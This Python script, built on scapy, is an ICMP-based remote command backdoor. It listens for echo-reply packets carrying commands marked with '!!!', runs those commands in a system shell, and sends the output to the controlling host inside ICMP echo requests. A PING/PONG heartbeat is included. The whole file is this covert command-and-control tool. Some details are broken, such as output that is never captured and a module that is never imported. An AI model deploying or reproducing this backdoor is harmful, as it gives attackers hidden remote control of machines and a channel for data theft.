from scapy.all import *
from scapy.all import IP,ICMP
import subprocess

def send_over_icmp(server, response):
    serverresponse = "###" + response
    evil = IP(dst=server)/ICMP(type=8)/(serverresponse)
    send(evil)

def execute_command(server, command):
    p = subprocess.Popen(command, shell=True)
    output, error = p.communicate()
    send_over_icmp(server, output)

def reply(src, command):
    if command == "PING":
            send_over_icmp(src, "PONG")

def handle(pkt):
    src = pkt[IP].dst
    payload = str(pkt.payload)
    parsed = re.split('!{3}', payload)
    if len(parsed) == 1:
        return
    else: 
        command = parsed[1][:-1]
        if command[0] == "_":
            execute = False
            command = command[1:]
        else:
            execute = True
        
        if execute:
            execute_command(src, command)
        else:
            reply(src, command)
    
        

sniff(filter="icmp[icmptype] == icmp-echoreply", prn=handle)
